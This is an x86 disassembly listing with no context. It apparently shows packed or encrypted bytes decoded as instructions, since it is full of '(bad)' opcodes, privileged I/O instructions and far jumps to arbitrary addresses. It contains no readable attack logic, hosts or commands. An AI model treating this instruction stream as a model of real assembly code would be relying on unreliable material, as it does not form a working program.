  40e371:	jno    0x2b49629c
  40e377:	(bad)  
  40e378:	icebp  
  40e379:	adc    BYTE PTR [ebp-0x3c222fba],dh
  40e37f:	inc    ebp
  40e380:	imul   eax,ebp,0xe4a5319b
  40e386:	cmc    
  40e387:	outs   dx,DWORD PTR ds:[esi]
  40e388:	iret   
  40e389:	add    cl,dl
  40e38b:	mov    ds:0xfda21917,eax
  40e390:	sub    eax,0x3be0f82c
  40e395:	mov    edx,0xeee85cfe
  40e39a:	or     cl,bl
  40e39c:	outs   dx,BYTE PTR ds:[esi]
  40e39d:	sbb    ah,BYTE PTR [eax+0x32857cee]
  40e3a3:	jl     0x40e3f7
  40e3a5:	test   DWORD PTR [ebp-0xa],esp
  40e3a8:	das    
  40e3a9:	sbb    DWORD PTR [edi-0x4],esi
  40e3ac:	or     al,0x6b
  40e3ae:	mov    bl,0x51
  40e3b0:	mov    WORD PTR [eax+0x7e],es
  40e3b3:	(bad)  [ebp+0x336b471a]
  40e3b9:	mov    bh,0x32
  40e3bb:	mov    ebx,0x5e1231d5
  40e3c0:	jo     0x40e398
  40e3c2:	repnz fbld TBYTE PTR ds:0x36f626a4
  40e3c9:	xchg   ebp,eax
  40e3ca:	test   DWORD PTR [ebp+0xddb3a75],esp
  40e3d0:	xlat   BYTE PTR ds:[ebx]
  40e3d1:	mov    esi,0x648da1fb
  40e3d6:	pop    esp
  40e3d7:	add    ah,BYTE PTR ds:0xfaf338b8
  40e3dd:	inc    esi
  40e3de:	or     al,0xa6
  40e3e0:	test   edx,0xea9e258a
  40e3e6:	sbb    al,0x9c
  40e3e8:	test   al,0xd7
  40e3ea:	repz out dx,al
  40e3ec:	mov    ds:0xcce19e8e,al
  40e3f1:	and    al,0x63
  40e3f3:	inc    esp
  40e3f4:	retf   
  40e3f5:	jmp    0xa81bbe23
  40e3fa:	jo     0x40e383
  40e3fc:	fcmovnb st,st(1)
  40e3fe:	cmp    DWORD PTR [edx],ecx
  40e400:	fist   WORD PTR [ebx-0xa0b1156]
  40e406:	out    dx,al
  40e407:	adc    eax,0x3f0a38c
  40e40c:	pop    esp
  40e40d:	dec    edi
  40e40e:	(bad)  
  40e40f:	adc    dl,BYTE PTR [ebp+0x162d24d7]
  40e415:	outs   dx,BYTE PTR ds:[esi]
  40e416:	loope  0x40e404
  40e418:	aas    
  40e419:	inc    DWORD PTR [edx+edi*4-0x24bb3284]
  40e420:	mov    ah,0x5a
  40e422:	outs   dx,DWORD PTR ds:[esi]
  40e423:	xchg   ebp,eax
  40e424:	jle    0x40e3e4
  40e426:	pop    eax
  40e427:	cmp    DWORD PTR [eax],edx
  40e429:	push   edx
  40e42a:	out    0xbf,al
  40e42c:	xchg   ecx,esi
  40e42e:	add    bl,ah
  40e430:	aaa    
  40e431:	push   0x7595a270
  40e436:	retf   0x8ca3
  40e439:	add    esi,0x665044e2
  40e43f:	pop    esp
  40e440:	mov    eax,ds:0xefa0f45f
  40e445:	xchg   ebx,eax
  40e446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e447:	aas    
  40e448:	addr16 mov esi,0xc513625a
  40e44e:	clc    
  40e44f:	bound  esi,QWORD PTR [ebx+0x117cf1d7]
  40e455:	enter  0x9a50,0x59
  40e459:	cmp    ah,0x69
  40e45c:	lods   eax,DWORD PTR ds:[esi]
  40e45d:	fsubr  QWORD PTR [ebx-0x417fca7e]
  40e463:	les    esp,FWORD PTR [edx]
  40e465:	jns    0x40e44b
  40e467:	pop    ebx
  40e468:	scas   eax,DWORD PTR es:[edi]
  40e469:	push   cs
  40e46a:	cmp    eax,DWORD PTR [esi]
  40e46c:	sti    
  40e46d:	mov    ebx,0x5533719e
  40e472:	adc    eax,0xa33bbf5c
  40e477:	push   esp
  40e478:	mov    edi,0x1363c671
  40e47d:	push   edi
  40e47e:	add    esp,eax
  40e480:	jmp    0x40e4bf
  40e482:	iret   
  40e483:	repz dec edx
  40e485:	jge    0x40e4d3
  40e487:	(bad)  
  40e489:	sbb    DWORD PTR [ecx-0x3c3294f9],eax
  40e48f:	mov    esp,0xb5168fdc
  40e494:	cmp    eax,DWORD PTR [esp+ebp*1-0x6eef5036]
  40e49b:	stos   DWORD PTR es:[edi],eax
  40e49c:	cmp    ch,BYTE PTR [edi]
  40e49e:	icebp  
  40e49f:	sbb    DWORD PTR [edx],edx
  40e4a1:	cmp    eax,0x78fff7bd
  40e4a6:	mov    cs,WORD PTR [esi-0x6bf88ef8]
  40e4ac:	lahf   
  40e4ad:	nop
  40e4ae:	dec    ebp
  40e4af:	jno    0x40e496
  40e4b1:	ja     0x40e51f
  40e4b3:	test   BYTE PTR [edx],dl
  40e4b5:	push   es
  40e4b6:	stos   DWORD PTR es:[edi],eax
  40e4b7:	arpl   bx,di
  40e4b9:	test   BYTE PTR [eax],0x67
  40e4bc:	jle    0x40e4bb
  40e4be:	lods   eax,DWORD PTR ds:[esi]
  40e4bf:	push   0xe724c8d4
  40e4c4:	adc    dl,BYTE PTR [esp+ebx*4+0xd]
  40e4c8:	inc    eax
  40e4c9:	ret    
  40e4ca:	stos   BYTE PTR es:[edi],al
  40e4cb:	xchg   DWORD PTR [ebp+0x1d4ec66c],ecx
  40e4d1:	mov    ebx,0x77262c7f
  40e4d6:	pop    edx
  40e4d7:	jne    0x40e488
  40e4d9:	mov    edx,0xa86b384e
  40e4de:	add    eax,0x19b223d2
  40e4e3:	cld    
  40e4e4:	loopne 0x40e491
  40e4e6:	xchg   esp,eax
  40e4e7:	inc    esi
  40e4e9:	pop    es
  40e4ea:	mov    ah,0x90
  40e4ec:	mov    esp,0xcc04da61
  40e4f1:	and    DWORD PTR ds:0xd2852a23,edx
  40e4f7:	pop    edi
  40e4f8:	dec    ecx
  40e4f9:	push   ss
  40e4fa:	xor    DWORD PTR [eax+0x118474e0],ebx
  40e500:	out    dx,al
  40e501:	or     eax,DWORD PTR [eax-0xa]
  40e504:	sub    ecx,DWORD PTR [ecx]
  40e506:	xor    al,0xaf
  40e508:	adc    al,0x2d
  40e50a:	mov    bl,BYTE PTR [edx+0x10]
  40e50d:	aaa    
  40e50e:	out    0x3f,eax
  40e510:	outs   dx,DWORD PTR ds:[esi]
  40e511:	int3   
  40e512:	mov    edx,0xb0113827
  40e517:	mov    edi,0x793606c1
  40e51c:	adc    eax,0x5d999360
  40e521:	fstp   st(2)
  40e523:	jmp    0x40e4a8
  40e525:	pop    ds
  40e526:	shl    DWORD PTR [ecx+0x45],0x6b
  40e52a:	int3   
  40e52b:	clc    
  40e52c:	dec    ecx
  40e52d:	xchg   edx,eax
  40e52e:	repz xchg esp,eax
  40e530:	xor    al,0xdb
  40e532:	loope  0x40e553
  40e534:	dec    ecx
  40e535:	ins    BYTE PTR es:[edi],dx
  40e536:	xchg   esp,eax
  40e537:	repz popa 
  40e539:	xchg   esp,eax
  40e53a:	mov    ebp,0xaa1f35b2
  40e53f:	jo     0x40e4e2
  40e541:	sbb    al,0x3d
  40e543:	cli    
  40e544:	xchg   esp,eax
  40e545:	pop    edi
  40e546:	das    
  40e547:	data16 addr16 mov ch,0x93
  40e54b:	xlat   BYTE PTR ds:[ebx]
  40e54c:	pop    ebx
  40e54d:	and    ah,al
  40e54f:	cmp    DWORD PTR [esi+0x74],esi
  40e552:	jb     0x40e55a
  40e554:	push   esp
  40e555:	arpl   WORD PTR [ecx-0x20f174cd],bp
  40e55b:	into   
  40e55c:	in     eax,dx
  40e55d:	into   
  40e55e:	jb     0x40e4ef
  40e560:	mov    al,ds:0x33b71e58
  40e565:	jmp    0xdeb18c87
  40e56a:	outs   dx,DWORD PTR ds:[esi]
  40e56b:	sbb    eax,0x1d46dd50
  40e570:	add    al,0x1a
  40e572:	fidivr DWORD PTR [edi]
  40e574:	fisttp QWORD PTR [ecx+0x55]
  40e577:	inc    edi
  40e578:	push   ebx
  40e579:	cmp    eax,0x8c2e92fd
  40e57e:	or     ch,ah
  40e580:	xor    BYTE PTR [ebp-0x42],dh
  40e583:	das    
  40e584:	add    eax,0x3feacb97
  40e589:	xchg   ebp,eax
  40e58a:	fldlg2 
  40e58d:	xlat   BYTE PTR ds:[ebx]
  40e58e:	cmp    BYTE PTR [ebx+esi*2],0x70
  40e592:	and    ecx,DWORD PTR [ebx]
  40e594:	mov    al,0xf2
  40e596:	sub    DWORD PTR [edi-0x55],edx
  40e599:	fs push esi
  40e59b:	in     al,0x93
  40e59d:	out    0x8a,al
  40e59f:	sub    al,0x45
  40e5a1:	jle    0x40e587
  40e5a3:	pop    esi
  40e5a4:	ins    BYTE PTR es:[edi],dx
  40e5a5:	mov    DWORD PTR [ecx+0x70cd21da],0x62d156b1
  40e5af:	pop    eax
  40e5b0:	cmp    ch,dh
  40e5b2:	cmp    BYTE PTR [eax-0x16ca4d65],bl
  40e5b8:	aam    0xa3
  40e5ba:	shl    BYTE PTR [esi+edi*8],cl
  40e5bd:	add    BYTE PTR [esp+eax*4],0xa3
  40e5c1:	inc    esp
  40e5c2:	xchg   edx,eax
  40e5c3:	pop    edi
  40e5c4:	and    BYTE PTR [edx+ebp*2],0x50
  40e5c8:	or     eax,0xc3150ef
  40e5cd:	cli    
  40e5ce:	jecxz  0x40e63b
  40e5d0:	cld    
  40e5d1:	popa   
  40e5d2:	cmc    
  40e5d3:	pop    ebp
  40e5d4:	fidiv  DWORD PTR [esi-0xe128b97]
  40e5da:	in     eax,dx
  40e5db:	xchg   ebp,eax
  40e5dc:	lods   eax,DWORD PTR ds:[esi]
  40e5dd:	pop    esp
  40e5de:	xlat   BYTE PTR ds:[ebx]
  40e5df:	dec    esi
  40e5e0:	test   DWORD PTR [edx+esi*2],0x3d3398b1
  40e5e7:	xor    DWORD PTR [ecx],esp
  40e5e9:	int3   
  40e5ea:	mov    ds:0x50431610,eax
  40e5ef:	das    
  40e5f0:	pop    ss
  40e5f1:	ins    DWORD PTR es:[edi],dx
  40e5f2:	jbe    0x40e59c
  40e5f4:	(bad)
  40e5f7:	sub    esi,DWORD PTR [esp+eiz*8+0x19f3b7d1]
  40e5fe:	mov    al,ds:0x605850a0
  40e603:	xchg   edi,eax
  40e604:	inc    edi
  40e605:	sub    eax,0x48148556
  40e60a:	push   ss
  40e60b:	outs   dx,BYTE PTR ds:[esi]
  40e60c:	pop    ecx
  40e60d:	jo     0x40e5ae
  40e60f:	jmp    DWORD PTR [ecx+edi*2]
  40e612:	shr    ecx,cl
  40e614:	ins    DWORD PTR es:[edi],dx
  40e615:	or     ebp,DWORD PTR [ecx-0x2]
  40e618:	leave  
  40e619:	ss inc eax
  40e61b:	or     ch,bl
  40e61d:	jle    0x40e605
  40e61f:	ins    DWORD PTR es:[di],dx
  40e621:	ins    BYTE PTR es:[edi],dx
  40e622:	ins    BYTE PTR es:[edi],dx
  40e623:	or     eax,0x965ef389
  40e628:	xchg   edx,eax
  40e629:	pop    esp
  40e62a:	cld    
  40e62b:	push   0x1
  40e62d:	sbb    esp,DWORD PTR [ebx+0x2d]
  40e630:	(bad)  
  40e631:	in     al,dx
  40e632:	jmp    0x2372:0x6b23da26
  40e639:	into   
  40e63a:	into   
  40e63b:	xor    DWORD PTR [ebp-0x66],eax
  40e63e:	in     al,0xfd
  40e640:	icebp  
  40e641:	out    dx,al
  40e642:	push   ecx
  40e643:	mov    ds:0xe99ad32,eax
  40e648:	(bad)  
  40e649:	daa    
  40e64a:	mov    eax,0x654e2a1a
  40e64f:	scas   al,BYTE PTR es:[edi]
  40e650:	shl    BYTE PTR [edi+ebx*2],cl
  40e653:	rcl    BYTE PTR [edx-0x78],0x6e
  40e657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e658:	jg     0x40e605
  40e65a:	sbb    dh,BYTE PTR [ecx+0x50]
  40e65d:	rol    DWORD PTR ss:[eax-0x23],cl
  40e661:	xor    eax,0x510b7817
  40e666:	out    dx,eax
  40e667:	bound  ecx,QWORD PTR [ecx+0x37d57de8]
  40e66d:	pop    edi
  40e66e:	cmp    eax,0xa5653252
  40e673:	test   BYTE PTR [eax],ah
  40e675:	int3   
  40e676:	imul   edi,DWORD PTR [eax+0x5ba7b7e],0xffffff84
  40e67d:	pop    ecx
  40e67e:	int    0x4f
  40e680:	inc    eax
  40e681:	shl    BYTE PTR [edi-0x27],1
  40e684:	sub    eax,0xefa956e2
  40e689:	out    dx,al
  40e68a:	sbb    esp,DWORD PTR [edi+0x3819c344]
  40e690:	cmp    DWORD PTR [esi-0x19aece1d],ebx
  40e696:	mov    ebx,0x4a7c9b72
  40e69b:	push   edi
  40e69c:	sti    
  40e69d:	mov    esi,0x8f601796
  40e6a2:	ins    DWORD PTR es:[edi],dx
  40e6a3:	ja     0x40e6b8
  40e6a5:	repz test cl,ah
  40e6a8:	xchg   edi,eax
  40e6a9:	sti    
  40e6aa:	js     0x40e630
  40e6ac:	daa    
  40e6ad:	inc    ebx
  40e6ae:	pusha  
  40e6af:	fcomp  DWORD PTR [esi-0x13816bf1]
  40e6b5:	dec    edx
  40e6b6:	and    DWORD PTR [esi+0x113d2e2d],0x2e892ae5
  40e6c0:	ja     0x40e6a3
  40e6c2:	inc    eax
  40e6c3:	mov    ds:0xaf8cc4e4,eax
  40e6c8:	pop    ebp
  40e6c9:	xchg   edi,eax
  40e6ca:	mov    eax,cs
  40e6cc:	xor    DWORD PTR [edi+eax*8-0x5aa534dd],edx
  40e6d3:	loopne 0x40e6db
  40e6d5:	retf   
  40e6d6:	rcl    BYTE PTR [eax+0x47d846bb],1
  40e6dc:	push   ds
  40e6dd:	dec    ebp
  40e6de:	mov    eax,DWORD PTR [ebx+edi*1+0x7c2adb24]
  40e6e5:	sbb    esi,DWORD PTR [ebp-0x46]
  40e6e8:	xor    DWORD PTR es:[edi+esi*4+0x44926c76],esp
  40e6f0:	fild   QWORD PTR [ebp+0x1ad009c4]
  40e6f6:	mov    esp,ebx
  40e6f8:	cmp    al,0xda
  40e6fa:	fld    QWORD PTR [edi]
  40e6fc:	jmp    0x40e690
  40e6fe:	stos   BYTE PTR es:[edi],al
  40e6ff:	data16 xor dh,ah
  40e702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e703:	push   ecx
  40e704:	pushf  
  40e705:	(bad)  
  40e706:	fisub  WORD PTR [esi-0x31]
  40e709:	dec    esp
  40e70a:	inc    esp
  40e70b:	xchg   DWORD PTR [ebx+0x47e53798],edi
  40e711:	mov    al,ds:0x40129aa6
  40e716:	imul   esi,DWORD PTR [ebx],0x9ad93c63
  40e71c:	imul   eax,DWORD PTR [edi+edx*2],0x22
  40e720:	loopne 0x40e74f
  40e722:	mov    edx,0xd26329b4
  40e727:	xchg   esp,eax
  40e728:	adc    BYTE PTR [ecx-0x5448ce15],ch
  40e72e:	mov    ebx,edx
  40e730:	sub    edx,ebx
  40e732:	push   ss
  40e733:	cld    
  40e734:	mov    ebx,0x814bee4
  40e739:	mov    esi,0xc38132bd
  40e73e:	stos   BYTE PTR es:[edi],al
  40e73f:	mov    ecx,0x67e17b40
  40e744:	lahf   
  40e745:	retf   
  40e746:	dec    edx
  40e747:	sub    ch,BYTE PTR ds:[edi+0x6c10b8ba]
  40e74e:	test   DWORD PTR [ecx-0x253a7be3],edi
  40e754:	hlt    
  40e755:	sub    al,0xe7
  40e757:	popa   
  40e758:	cli    
  40e759:	mov    eax,ds
  40e75b:	adc    al,0x74
  40e75d:	mov    eax,0xb328f025
  40e762:	mov    bh,0xc5
  40e764:	imul   edx,DWORD PTR [eax-0x70],0xffffffe1
  40e768:	retf   0xf92c
  40e76b:	or     dh,bh
  40e76d:	xchg   edi,eax
  40e76e:	cmp    edi,DWORD PTR [ebx+0x467332e]
  40e774:	sbb    esp,DWORD PTR [edi]
  40e776:	pop    esp
  40e777:	neg    DWORD PTR [esi-0x17582d74]
  40e77d:	fwait
  40e77e:	mov    DWORD PTR [esi],ebx
  40e780:	push   ebp
  40e781:	popa   
  40e782:	cli    
  40e783:	xor    DWORD PTR [edx+edi*2+0x25],edi
  40e787:	mov    al,ds:0x1bd6d616
  40e78c:	sub    al,0x9a
  40e78e:	add    eax,eax
  40e790:	dec    edi
  40e791:	jnp    0x40e755
  40e793:	out    dx,eax
  40e794:	lock cld 
  40e796:	dec    ebp
  40e797:	dec    esi
  40e798:	jmp    0x6fe4:0xc47bf0fc
  40e79f:	(bad)  
  40e7a0:	pop    ds
  40e7a1:	sub    eax,0xe1162cc3
  40e7a6:	mov    ds:0x55b8a19a,eax
  40e7ab:	nop
  40e7ac:	mov    ebx,0x6ac7cf81
  40e7b1:	pop    DWORD PTR [ecx+0x18]
  40e7b4:	dec    edx
  40e7b5:	(bad)  [edi]
  40e7b7:	dec    ebx
  40e7b8:	push   ebp
  40e7b9:	popf   
  40e7ba:	mov    ebx,0x8db42bd6
  40e7bf:	(bad)  
  40e7c0:	lea    esi,[edi+0xd08e4b2]
  40e7c6:	dec    esi
  40e7c7:	jb     0x40e768
  40e7c9:	and    DWORD PTR [edi],edx
  40e7cb:	adc    eax,0x4c7d9d19
  40e7d0:	(bad)  
  40e7d1:	and    eax,0xcd06c136
  40e7d6:	xor    al,0xca
  40e7d8:	pop    ebx
  40e7d9:	dec    eax
  40e7da:	out    0xa8,al
  40e7dc:	scas   al,BYTE PTR es:[edi]
  40e7dd:	add    eax,0x91712eb7
  40e7e2:	pop    esp
  40e7e3:	sbb    eax,0xf7af165f
  40e7e8:	xchg   edi,eax
  40e7e9:	dec    eax
  40e7ea:	repnz mov ds:0x39e1a07a,al
  40e7f0:	jo     0x40e790
  40e7f2:	adc    cl,bh
  40e7f4:	aad    0xe7
  40e7f6:	and    DWORD PTR [ebx-0x1d],0x47911e96
  40e7fd:	fwait
  40e7fe:	xlat   BYTE PTR ds:[ebx]
  40e7ff:	and    edx,DWORD PTR [ebp+0x1c26715f]
  40e805:	jb     0x40e79e
  40e807:	push   ebp
  40e808:	cmp    al,BYTE PTR [ecx-0xf334294]
  40e80e:	pop    edi
  40e80f:	lods   eax,DWORD PTR ds:[esi]
  40e810:	int    0x44
  40e812:	daa    
  40e813:	cmp    BYTE PTR [eax+eiz*1-0x253d818d],dl
  40e81a:	test   BYTE PTR [edi+0x20c4b42e],dl
  40e820:	adc    eax,0x3f45a299
  40e825:	jnp    0x40e81a
  40e827:	enter  0x3480,0xe0
  40e82b:	in     al,0xb9
  40e82d:	dec    esi
  40e82e:	test   edx,ebp
  40e830:	xchg   esi,eax
  40e831:	dec    esp
  40e832:	mov    dh,BYTE PTR [eax-0x21]
  40e835:	rcl    BYTE PTR [edx-0x70],1
  40e838:	pop    edx
  40e839:	loop   0x40e7c8
  40e83b:	mov    al,0xb1
  40e83d:	dec    ecx
  40e83e:	or     BYTE PTR [edx-0x67],dh
  40e841:	fdiv   st,st(5)
  40e843:	sbb    al,0x64
  40e845:	ins    BYTE PTR es:[edi],dx
  40e846:	outs   dx,BYTE PTR ds:[esi]
  40e847:	cld    
  40e848:	sbb    BYTE PTR [ebp+0x6eafa4ee],dl
  40e84e:	rcl    esp,0xd6
  40e851:	xchg   edx,eax
  40e852:	bound  eax,QWORD PTR [edi-0x46]
  40e855:	stos   DWORD PTR es:[edi],eax
  40e856:	es push ecx
  40e858:	mov    bl,0xb4
  40e85a:	addr16 mov ebp,0x9c59c601
  40e860:	sub    BYTE PTR [eax+0x13766b41],cl
  40e866:	push   eax
  40e867:	sbb    dl,BYTE PTR [eax+0x27]
  40e86a:	dec    edi
  40e86b:	adc    al,0xdb
  40e86d:	xor    eax,0xaedcde18
  40e872:	in     eax,dx
  40e873:	ss inc esp
  40e875:	loopne 0x40e85b
  40e877:	mov    al,ds:0x99a8b34e
  40e87c:	xchg   ebx,eax
  40e87d:	mov    eax,0x6a036514
  40e882:	stos   BYTE PTR es:[edi],al
  40e883:	adc    DWORD PTR [esi-0x4d],ebx
  40e886:	addr16 (bad) 
  40e888:	fstp   TBYTE PTR [ebp+0x1d]
  40e88b:	adc    al,0x35
  40e88d:	adc    cl,dl
  40e88f:	addr16 dec ecx
  40e891:	lock out 0x66,al
  40e894:	push   eax
  40e895:	xchg   esp,eax
  40e896:	inc    ebp
  40e897:	or     cl,BYTE PTR [eax]
  40e899:	inc    ecx
  40e89a:	xor    DWORD PTR [ebx],eax
  40e89c:	stc    
  40e89d:	call   0xad398234
  40e8a2:	ror    DWORD PTR [edx],0x35
  40e8a5:	xchg   BYTE PTR [esi-0x331d4144],bl
  40e8ab:	and    bl,bh
  40e8ad:	add    al,0x35
  40e8af:	pop    edi
  40e8b0:	pop    ecx
  40e8b1:	stos   BYTE PTR es:[edi],al
  40e8b2:	stos   DWORD PTR es:[edi],eax
  40e8b3:	mov    cl,0x1f
  40e8b5:	repnz or bh,cl
  40e8b8:	mov    ecx,0xc6f18f05
  40e8bd:	push   0x2d
  40e8bf:	cmp    DWORD PTR [edi+0x14],0xffffffc1
  40e8c3:	push   ecx
  40e8c4:	xor    BYTE PTR [ebp+0x59],ah
  40e8c7:	xor    dl,BYTE PTR [eax-0x4689980d]
  40e8cd:	fsubr  st,st(5)
  40e8cf:	pop    ebp
  40e8d0:	adc    DWORD PTR [ebp+0x75],edi
  40e8d3:	arpl   WORD PTR [esi],cx
  40e8d5:	mov    ds:0x8c66bcd6,eax
  40e8da:	sub    BYTE PTR [edx+eiz*8+0x76],ch
  40e8de:	ins    DWORD PTR es:[edi],dx
  40e8df:	sbb    DWORD PTR [ecx+0x102b8c50],edi
  40e8e5:	dec    ebx
  40e8e6:	mov    ah,ch
  40e8e8:	or     al,0x24
  40e8ea:	das    
  40e8eb:	lea    ebx,[esi+0x4e]
  40e8ee:	sar    BYTE PTR [esi+0x2b32945e],cl
  40e8f4:	mov    eax,ebp
  40e8f6:	mov    ecx,0x14c928d4
  40e8fb:	ins    DWORD PTR es:[edi],dx
  40e8fc:	sbb    al,0x37
  40e8fe:	mov    ah,0xfb
  40e900:	or     BYTE PTR [edi-0x116828d3],bl
  40e906:	jmp    0x40e972
  40e908:	push   esp
  40e909:	pop    DWORD PTR [ebp-0x67e60e54]
  40e90f:	jmp    0x26f9:0x2a3ff332
  40e916:	jmp    0xbcd7:0xe9e5a092
  40e91d:	xchg   edi,eax
  40e91e:	out    dx,eax
  40e91f:	retf   0xd5cf
  40e922:	xor    al,0xe2
  40e924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e925:	iret   
  40e926:	fidivr DWORD PTR [ebx]
  40e928:	xor    eax,0x586084d1
  40e92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92e:	stos   BYTE PTR es:[edi],al
  40e92f:	arpl   WORD PTR [esi],bp
  40e931:	mov    ch,0xb4
  40e933:	icebp  
  40e934:	iret   
  40e935:	dec    ebp
  40e936:	adc    eax,0x10b3938
  40e93b:	out    dx,al
  40e93c:	mov    esp,DWORD PTR [ecx+edx*8-0x44]
  40e940:	and    ebp,DWORD PTR [ebx+0x7d06f7d3]
  40e946:	fstp   QWORD PTR [ebx-0x16]
  40e949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e94a:	mov    esp,ebp
  40e94c:	xor    BYTE PTR [edx+0xd],dh
  40e94f:	dec    esp
  40e950:	pop    ebx
  40e951:	shr    DWORD PTR [esi+0xffc8e52],1
  40e957:	(bad)  
  40e958:	mov    ah,0x9f
  40e95a:	pop    ss
  40e95b:	mov    dl,0xee
  40e95d:	jno    0x40e936
  40e95f:	call   0xab28:0xcdf710a
  40e966:	mov    dl,0x38
  40e968:	and    al,0xf9
  40e96a:	push   eax
  40e96b:	pop    ds
  40e96c:	jg     0x40e8f9
  40e96e:	xchg   edx,eax
  40e96f:	arpl   WORD PTR [ebx+0xa3cfe0c],bx
  40e975:	dec    esi
  40e976:	int3   
  40e977:	mov    DWORD PTR [esp+eiz*8],0x5fd4be0e
  40e97e:	push   es
  40e97f:	cdq    
  40e980:	inc    esp
  40e981:	repz les ebx,FWORD PTR [esi]
  40e984:	and    BYTE PTR [esi],0x70
  40e987:	push   ds
  40e988:	ss repnz enter 0x92dd,0x26
  40e98e:	lds    esi,FWORD PTR [esi-0x119b603]
  40e994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e995:	fsub   st(5),st
  40e997:	aas    
  40e998:	ds ins BYTE PTR es:[edi],dx
  40e99a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e99b:	xchg   BYTE PTR ds:0x57c32f20,al
  40e9a1:	das    
  40e9a2:	cwde   
  40e9a3:	(bad)  
  40e9a4:	arpl   bp,bx
  40e9a6:	rol    BYTE PTR [eax-0x5af3197b],0x26
  40e9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ae:	ror    eax,0x5a
  40e9b1:	push   es
  40e9b2:	imul   edx,DWORD PTR [edi+0x1b0d4f4b],0x1ed31fc6
  40e9bc:	scas   eax,DWORD PTR es:[edi]
  40e9bd:	fist   WORD PTR [eax]
  40e9bf:	ja     0x40e971
  40e9c1:	mov    DWORD PTR cs:[ebp+0x4dfbe68d],ebp
  40e9c8:	and    DWORD PTR [edi],ecx
  40e9ca:	sti    
  40e9cb:	arpl   WORD PTR [edi],di
  40e9cd:	mov    esi,0xf73332c1
  40e9d2:	mov    esi,0x1e32172c
  40e9d7:	mov    eax,ds:0x439867be
  40e9dc:	out    0x12,eax
  40e9de:	cdq    
  40e9df:	push   edi
  40e9e0:	repz retf 0xf780
  40e9e4:	mov    ?,WORD PTR [esi]
  40e9e6:	rcl    BYTE PTR [esi-0x1ef882fa],0x51
  40e9ed:	jge    0x40e99a
  40e9ef:	add    edx,DWORD PTR [ebx-0x676f3a2b]
  40e9f5:	addr16 mov bh,0xa0
  40e9f8:	test   eax,0xdf902f3b
  40e9fd:	and    DWORD PTR [edx+0x76],eax
  40ea00:	push   edx
  40ea01:	xchg   edi,eax
  40ea02:	stos   BYTE PTR es:[edi],al
  40ea03:	aaa    
  40ea04:	fsubr  QWORD PTR [edx-0x78]
  40ea07:	fadd   QWORD PTR [esi]
  40ea09:	fnsave [esi]
  40ea0b:	push   eax
  40ea0c:	ds sub al,0x3b
  40ea0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea10:	(bad)  
  40ea11:	mov    al,ds:0x244c25bf
  40ea16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea17:	test   al,0xce
  40ea19:	mov    ecx,0xa8509fc0
  40ea1e:	gs pop eax
  40ea20:	pusha  
  40ea21:	sbb    DWORD PTR [esi+0x60c60079],edi
  40ea27:	mov    esp,0x5cb9cb86
  40ea2c:	pop    esp
  40ea2d:	fiadd  DWORD PTR [ecx+0x21bedbc3]
  40ea33:	jl     0x40e9b8
  40ea35:	lea    ebx,[ecx+eax*2]
  40ea38:	(bad)  
  40ea39:	call   FWORD PTR [ebp-0x4196029b]
  40ea3f:	and    al,BYTE PTR [edx]
  40ea41:	das    
  40ea42:	out    0xfe,eax
  40ea44:	mov    BYTE PTR [edx],bl
  40ea46:	pusha  
  40ea47:	outs   dx,BYTE PTR ds:[esi]
  40ea48:	and    eax,edx
  40ea4a:	add    BYTE PTR [ecx-0x31],cl
  40ea4d:	aaa    
  40ea4e:	mov    BYTE PTR [edx],bl
  40ea50:	and    esp,DWORD PTR [edi+edi*2]
  40ea53:	dec    ecx
  40ea54:	es push edi
  40ea56:	and    BYTE PTR [edx],bl
  40ea58:	out    0xdd,al
  40ea5a:	push   ds
  40ea5b:	(bad)  
  40ea5c:	dec    esp
  40ea5d:	aam    0xe7
  40ea5f:	cmp    al,0xa1
  40ea61:	(bad)  
  40ea62:	jb     0x40eaa1
  40ea64:	imul   edi,DWORD PTR [ebx],0x7976a7d3
  40ea6a:	adc    al,0xca
  40ea6c:	dec    edi
  40ea6d:	stc    
  40ea6e:	mov    cl,0x63
  40ea70:	xchg   esi,eax
  40ea71:	jb     0x40e9f7
  40ea73:	icebp  
  40ea74:	pop    ss
  40ea75:	mov    esi,0x2113c154
  40ea7a:	lock ins DWORD PTR es:[edi],dx
  40ea7c:	inc    ecx
  40ea7d:	lods   eax,DWORD PTR ds:[esi]
  40ea7e:	in     al,dx
  40ea7f:	cmp    DWORD PTR [edx+ebx*1],ebx
  40ea82:	push   esp
  40ea83:	fwait
  40ea84:	imul   ebx,DWORD PTR [esi],0xffffffdf
  40ea87:	mov    ah,BYTE PTR [edi+0x5]
  40ea8a:	add    ebx,DWORD PTR [ebp+0x2]
  40ea8d:	lods   eax,DWORD PTR ds:[esi]
  40ea8e:	jl     0x40ea25
  40ea90:	ret    0x71b6
  40ea93:	ret    0x7c3c
  40ea96:	dec    edi
  40ea97:	sub    BYTE PTR [edi+0x7],0x44
  40ea9b:	(bad)  
  40ea9c:	aam    0xd8
  40ea9e:	aam    0xb2
  40eaa0:	jns    0x40eaf2
  40eaa2:	pop    ebp
  40eaa3:	jmp    0x1c18:0x33559481
  40eaaa:	xchg   DWORD PTR [edx+0x3e49d420],esi
  40eab0:	lea    esp,[eax-0x79cac57d]
  40eab6:	clc    
  40eab7:	jbe    0x40eaaa
  40eab9:	mov    bh,0x93
  40eabb:	mov    ch,0x8c
  40eabd:	adc    BYTE PTR [ebp+0x143d8003],ah
  40eac3:	mov    cl,0xc3
  40eac5:	test   eax,0xe42eb756
  40eaca:	lds    esi,FWORD PTR [esp+eax*8-0x7cb2d580]
  40ead1:	stc    
  40ead2:	pop    ebp
  40ead3:	mov    edi,0xfa166269
  40ead8:	add    eax,0x49e4d0fc
  40eadd:	xchg   DWORD PTR [edx-0x40948f83],ecx
  40eae3:	rol    ah,0x98
  40eae6:	xchg   esp,eax
  40eae7:	or     DWORD PTR [eax+0x3e],ecx
  40eaea:	mov    DWORD PTR [esi],ebp
